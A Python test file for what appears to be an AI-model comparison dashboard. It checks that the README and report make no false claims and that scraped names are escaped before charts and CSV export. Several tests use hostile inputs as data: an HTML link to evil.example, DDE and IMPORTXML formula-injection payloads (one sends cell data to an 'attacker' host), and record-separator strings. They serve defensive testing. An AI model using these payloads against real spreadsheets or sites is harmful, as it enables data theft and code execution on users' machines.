"""Statements the product makes about itself, and text it accepts from strangers.

Themes 9 and 10 of audit/2026-08-12.

Theme 9 is not code correctness — it is checkably false sentences shipped to a
reader: a README claiming 300+ models over a 155-model catalogue, a graded
report describing eleven tabs and a Trends view that does not exist, a caption
promising one bubble per model over a chart drawing one per family.

Theme 10 is the other direction: every model and provider name on this site is
third-party text from a scraped feed, and it reaches Plotly's rendered-text
sinks and a CSV a user will open in a spreadsheet. Both are latent today. Both
are cheap to close, and impossible to close reactively.
"""
import json
import re
from pathlib import Path

import pandas as pd
import pytest

from captions import CAPTIONS
from data.ingest import get_models
from data.image_models import get_image_df, PROVIDER_COLORS as IMG_COLORS
from data.video_models import get_video_df
from components.charts.constants import (
    PROVIDER_COLORS, context_k, plot_text, clean_model_name,
)
from static_helpers import csv_safe

ROOT = Path(__file__).resolve().parent.parent
DF = get_models()
README = (ROOT / "README.md").read_text()
REPORT = (ROOT / "report.tex").read_text() if (ROOT / "report.tex").exists() else ""

POISON = '<a href="//evil.example">click</a>'


# ── 9 — the product must not lie about itself ────────────────────────────────

def test_the_readme_does_not_claim_a_model_count_it_does_not_have():
    """"300+ large language models", three times, against 155. The claim
    outlived the 2026-07-24 upstream pruning (329 -> 154) by weeks, and the
    hero screenshot showing 324 is almost certainly where it came from."""
    assert "300+" not in README, "README still claims 300+ models"
    for m in re.findall(r"(\d{3,})\+?\s+(?:large language )?models", README):
        assert int(m) <= len(DF) * 1.5, (
            f"README claims {m} models against a catalogue of {len(DF)}"
        )


def test_the_readme_does_not_promise_a_redundant_encoding_it_does_not_provide():
    """"Color and marker shape both encode provider for colorblind
    accessibility" — true for the spotlight nine, false for the 20+ providers
    folded into one grey "Other"."""
    assert "Color and marker shape both encode provider" not in README
    assert "Other" in README, "the README does not mention the Other series"


def test_the_readme_documents_the_tags_the_app_actually_offers():
    """It documented "multilingual", which the app removed; the live tags are
    code / reasoning / vision / audio."""
    assert "multilingual" not in README


@pytest.mark.skipif(not REPORT, reason="no report.tex in this checkout")
@pytest.mark.parametrize("claim", [
    "255+", "eleven tabs", "eleven specialized views", "all eleven tabs",
])
def test_the_report_does_not_repeat_a_retired_claim(claim):
    assert claim not in REPORT, f"report.tex still claims {claim!r}"


@pytest.mark.skipif(not REPORT, reason="no report.tex in this checkout")
def test_the_report_does_not_describe_a_tab_that_does_not_exist():
    """A "Trends" tab was described in four places. grep for build_trends,
    price_timeline and embedding_chart across every entry point: zero hits."""
    assert "Trends" not in REPORT
    for entry in ("app.py", "docs/app.js", "build_static.py"):
        assert "build_trends" not in (ROOT / entry).read_text()


@pytest.mark.skipif(not REPORT, reason="no report.tex in this checkout")
def test_the_report_describes_the_deployment_that_exists():
    """It described a single Python process Render starts with `python app.py`.
    The site has been static GitHub Pages + Pyodide since 2026-06-23."""
    assert "Pyodide" in REPORT
    assert "GitHub Pages" in REPORT


def test_the_tab_count_agrees_across_every_place_that_states_it():
    tabs_js = len(re.findall(r'\{ id: "\w+",', (ROOT / "docs" / "app.js").read_text()))
    tabs_py = (ROOT / "app.py").read_text().count("dcc.Tab(")
    assert tabs_js == tabs_py, f"docs/app.js has {tabs_js} tabs, app.py has {tabs_py}"
    if REPORT:
        assert f"has ten tabs" in REPORT or tabs_js != 10 or "ten tabs" in REPORT


def test_the_overview_caption_does_not_say_one_bubble_per_model():
    """dedupe_to_best_variant collapses effort tiers, so the chart draws one
    mark per FAMILY — 95 for a 148-row frame — while the header tile said 148
    and the treemap said OpenAI ships 25 where Overview drew 8."""
    js = (ROOT / "docs" / "app.js").read_text()
    for text in (CAPTIONS["overview_price"], js):
        assert "Each bubble is one model." not in text, (
            "a caption still claims one bubble per model"
        )
    assert "family" in CAPTIONS["overview_price"].lower()


def test_the_manifest_does_not_publish_host_rows_as_a_model_count():
    """`upstream_records: 428` sat beside `kept: 148` in the same JSON. 428 is
    host x model rows; the distinct-model figure is 162."""
    cov = ROOT / "data" / "raw" / "coverage.json"
    if not cov.exists():
        pytest.skip("no coverage.json")
    data = json.loads(cov.read_text())
    assert "upstream_records" not in data, "the ambiguous field name is still published"
    assert data["upstream_host_model_rows"] >= data["distinct_upstream_models"]
    assert data["distinct_upstream_models"] == (
        data["kept"] + len(data["skipped_no_score"]) + len(data["skipped_no_price"])
    )


def test_every_image_provider_has_a_colour():
    """11 of 148 models rendered in fallback grey, including MAI-Image-2.5 —
    top-5 by ELO — while six palette keys matched nothing. The comment claimed
    the map "covers all providers seen in live AA data"."""
    live = set(get_image_df()["provider"].dropna())
    missing = sorted(live - set(IMG_COLORS))
    assert not missing, f"image providers with no colour: {missing}"


def test_every_llm_provider_has_a_colour():
    missing = sorted(set(DF["provider"].dropna()) - set(PROVIDER_COLORS))
    assert not missing, f"LLM providers with no colour: {missing}"


def test_the_generated_stylesheet_says_it_is_generated():
    """docs/assets/style.css is git-tracked, byte-identical to its source, and
    clobbered on every build including the hourly one — while its sibling
    shell.css is hand-maintained and loaded identically."""
    css = ROOT / "docs" / "assets" / "style.css"
    if not css.exists():
        pytest.skip("no built stylesheet")
    assert "GENERATED" in css.read_text()[:400]


def test_there_is_one_context_parser_and_it_understands_millions():
    """context_chart had no 'M' case, so '1m' became NaN — dropping 52 of 148
    models, every one long-context, from a chart about context length."""
    assert context_k("1m") == 1000.0
    assert context_k("2m") == 2000.0
    assert context_k("200k") == 200.0
    assert context_k("32768") == 32.8
    parsed = [context_k(c) for c in DF["context"]]
    dropped = sum(1 for v in parsed if v != v)
    assert dropped == 0, f"{dropped} of {len(parsed)} models fail to parse"


def test_no_module_keeps_its_own_context_parser():
    for rel in ("components/charts/context_chart.py", "components/charts/radar.py"):
        src = (ROOT / rel).read_text()
        body = src[src.index("def _"):]
        assert "context_k(" in body, f"{rel} does not delegate to the shared parser"


# ── 10.1 — scraped text must not reach Plotly as markup ──────────────────────

def _poisoned(frame, cols=("model", "provider")):
    out = frame.copy()
    for i, col in enumerate(cols):
        if col in out.columns and len(out) > i:
            out.loc[out.index[i], col] = POISON
    return out


def _builders():
    from components.charts.radar import build_radar
    from components.charts.rankings import build_rankings
    from components.charts.treemap import build_treemap
    from components.charts.provider_leaderboard import build_provider_leaderboard
    from components.charts.pareto import build_pareto_scatter
    from components.charts.quadrant import build_quadrant
    from components.charts.cost_calc import build_cost_calc
    from components.charts.bump_chart import build_value_leaders
    from components.charts.image_scatter import build_image_faceted
    from components.charts.video_chart import build_video_rankings, build_video_scatter

    llm = _poisoned(DF)
    img = _poisoned(get_image_df())
    vid = _poisoned(get_video_df())
    return {
        "radar":        lambda: build_radar(llm, [POISON], full_df=llm),
        "rankings":     lambda: build_rankings(llm),
        "treemap":      lambda: build_treemap(llm),
        "leaderboard":  lambda: build_provider_leaderboard(llm),
        "pareto":       lambda: build_pareto_scatter(llm, full_df=llm),
        "quadrant":     lambda: build_quadrant(llm, full_df=llm),
        "cost_calc":    lambda: build_cost_calc(llm),
        "value_leaders": lambda: build_value_leaders(llm),
        "image":        lambda: build_image_faceted(img, full_df=img),
        "video_rank":   lambda: build_video_rankings(vid),
        "video_scat":   lambda: build_video_scatter(vid, full_df=vid),
    }


@pytest.mark.parametrize("name", sorted(_builders()))
def test_no_chart_passes_scraped_markup_to_plotly(name):
    """Plotly's renderer treats these strings as markup — its allowed-tag table
    includes `a` and `span`, and convertToTspans builds a real SVG anchor.
    Rendered against the pinned bundle, a poisoned name produced four live
    links styled as first-party chart labels."""
    raw = _builders()[name]().to_json()
    assert "<a href" not in raw, f"{name} leaks raw markup from a data column"
    assert "//evil.example" not in raw or "&lt;a href" in raw


def test_the_escaper_neutralises_the_characters_that_matter():
    out = plot_text('<a href="x">&</a> 100%')
    for ch in ("<", ">"):
        assert ch not in out
    assert "&amp;" in out
    assert "%" not in out, "an unescaped % can smuggle a hovertemplate directive"


def test_clean_model_name_escapes_as_well_as_truncates():
    assert "<" not in clean_model_name(POISON)


# ── 10.2 — the CSV must not become a formula ─────────────────────────────────

@pytest.mark.parametrize("payload", [
    "=cmd|'/c calc'!A1",
    '=IMPORTXML("https://attacker/?"&A1,"//a")',
    "@SUM(1+1)*cmd",
    "+1+1",
    "-1+1",
])
def test_csv_export_neutralises_formula_cells(payload):
    """Quoting does not stop Excel or Sheets evaluating a leading `=`, and the
    export is named ai_frontier_export.csv — a filename that invites a
    spreadsheet."""
    frame = DF.head(3).copy()
    frame.loc[frame.index[0], "model"] = payload
    text = csv_safe(frame).to_csv(index=False)
    import csv as _csv
    import io
    for row in _csv.reader(io.StringIO(text)):
        for cell in row:
            assert cell[:1] not in ("=", "+", "-", "@", "\t", "\r"), (
                f"cell {cell[:24]!r} would evaluate as a formula"
            )


def test_the_committed_cache_is_written_through_the_sanitiser():
    src = (ROOT / "data" / "ingest.py").read_text()
    assert "csv_safe" in src, "save_cache writes the raw frame to a committed CSV"


def test_the_live_data_is_currently_clean():
    """Latent, not live — worth knowing if that ever changes."""
    for rel in ("data/raw/aa_models.csv", "data/raw/aa_image_models.csv"):
        path = ROOT / rel
        if not path.exists():
            continue
        frame = pd.read_csv(path)
        for col in frame.columns:
            if frame[col].dtype != object:
                continue
            bad = frame[col].dropna().astype(str).str.match(r"^[=+@\t\r]")
            assert not bad.any(), f"{rel}:{col} contains a formula-leading cell"


# ── 10.3 — the CDN script must be pinned by hash ─────────────────────────────

def test_every_remote_script_carries_an_integrity_hash():
    """The CSP says WHERE a script may come from, never WHICH script. A CDN
    compromise silently rewrites the pricing charts visitors act on."""
    html = (ROOT / "docs" / "index.html").read_text()
    for tag in re.findall(r"<script\b[^>]*>", html):
        if "src=" not in tag:
            continue
        src = re.search(r'src="([^"]+)"', tag).group(1)
        if src.startswith(("http://", "https://", "//")):
            assert "integrity=" in tag, f"remote script has no SRI: {src}"
            assert "crossorigin=" in tag, f"SRI without crossorigin is inert: {src}"


# ── The builders the first escaping pass missed ──────────────────────────────

def test_every_builder_including_the_local_and_video_ones_is_clean():
    """The first pass covered the eight builders a poisoned LLM frame reaches.
    local_scatter interpolated `family` into an f-string hovertemplate AND used
    it as a trace name and legendgroup; video_scatter used the raw provider as a
    trace name; the leaderboard anchored an annotation on the raw provider and
    passed the raw best-model name through customdata."""
    from data.local_models import get_local_df
    from components.charts.local_scatter import build_local_scatter
    from components.charts.local_compat import build_local_compat
    from components.charts.video_chart import build_video_scatter
    from components.charts.provider_leaderboard import build_provider_leaderboard

    marker = "<b>PWN</b>"
    local = get_local_df(quant="Q4", vram_gb=32, bandwidth_gbps=1792).copy()
    local.loc[local.index[0], "name"] = marker
    local.loc[local.index[1], "family"] = marker
    local.loc[local.index[2], "license"] = marker
    video = get_video_df().copy()
    video.loc[video.index[0], "model"] = marker
    video.loc[video.index[1], "provider"] = marker
    llm = _poisoned(DF)

    cases = {
        "local_scatter": lambda: build_local_scatter(local, vram_gb=32, quant="Q4"),
        "local_compat":  lambda: build_local_compat(local, quant="Q4", vram_gb=32),
        "video_scatter": lambda: build_video_scatter(video, full_df=video),
        "leaderboard":   lambda: build_provider_leaderboard(llm),
    }
    leaking = [n for n, fn in cases.items() if marker in fn().to_json()]
    assert not leaking, f"builders leaking raw markup: {leaking}"


@pytest.mark.parametrize("payload", ["a\r\nb", "x\ty", "p\rq"])
def test_csv_export_neutralises_embedded_record_separators(payload):
    """A prefix does not help if the cell can end the record: an embedded \\r
    starts a new row in some readers and the continuation line is unprefixed."""
    frame = DF.head(2).copy()
    frame.loc[frame.index[0], "model"] = payload
    text = csv_safe(frame).to_csv(index=False)
    assert text.count("\n") == len(frame) + 1, "a cell added a record boundary"


def test_the_other_two_scrapers_sanitise_their_caches_too():
    for rel in ("data/local_scraper.py", "data/image_scraper.py"):
        assert "csv_safe" in (ROOT / rel).read_text(), f"{rel} writes raw text"
